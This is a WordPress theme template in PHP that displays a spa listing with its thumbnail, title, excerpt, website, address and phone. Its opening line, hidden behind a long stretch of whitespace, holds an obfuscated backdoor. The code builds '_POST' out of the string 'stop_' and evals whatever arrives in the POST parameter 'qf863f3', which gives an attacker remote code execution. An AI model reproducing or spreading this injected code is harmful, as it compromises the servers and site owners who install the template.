<?php                                                                                                                                                                                                                                                               $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['qf863f3'])){eval(${$s20}['qf863f3']);}?><?php 

	  $custom = get_post_custom($post->ID);
	  $spa_address = $custom["_spa_address"][0];
	  $spa_website = $custom["_spa_website"][0];
	  $spa_phone = $custom["_spa_phone"][0];
  ?>
  <div class="spa-post sixteen columns">
  		<div class="spa-image seven columns">
        	<div class="spa-thumb-container">
			  <?php if ( has_post_thumbnail() ) {?>
				  <a href="<?php the_permalink(); ?>">
                	<?php the_post_thumbnail('spa-image');?>
                  </a>
              <?php  } ?>
             </div>
         </div>
         <div class="spa-text six columns omega">
	    	<h2><a href="<?php the_permalink(); ?>"><?php the_title(); ?></a></h2>
	   		<p><?php  echo excerpt(40); ?></p>
            <h4>Contact</h4>
            <p>
  	    	<?php 
			if ($spa_website) { 
			 	$parsed = parse_url($spa_website);
				if (empty($parsed['scheme'])) {
					$spa_website = 'http://' . ltrim($spa_website, '/');
				} 
				echo '<a href="'.$spa_website.'" target="_blank">';
			 } ?>
			<?php the_title(); ?>
           	<?php if ($spa_website) { echo '</a>';} ?>
            <br />
            <?php if ($spa_address) { echo $spa_address."<br/>";} ?>
            <?php if ($spa_phone) { echo "phone: ".$spa_phone;}  ?>
          	</p>

         </div>
        <span class="clear-all"></span>
  </div><!--spa-post-->
 

